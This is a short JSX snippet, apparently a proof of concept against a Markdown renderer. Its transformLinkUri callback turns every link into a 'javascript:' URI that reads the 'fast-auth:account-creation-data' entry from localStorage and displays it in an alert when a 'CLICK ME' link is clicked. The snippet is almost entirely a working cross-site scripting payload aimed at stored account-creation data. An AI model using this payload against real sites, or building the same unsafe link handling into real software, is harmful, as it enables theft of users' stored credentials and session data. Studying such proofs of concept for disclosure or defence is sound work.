javascript;
const lt = (a, b, c) => {
  console.log("lt", a, b, c);
};
const tlu = (a, b, c) => {
  return "javascript:window.key=localStorage.getItem('fast-auth:account-creation-data');alert(window.key)";
};

const haha = (
  <Markdown
    linkTarget={lt}
    transformLinkUri={tlu}
    text="[CLICK ME](a)"
  ></Markdown>
);
return haha;
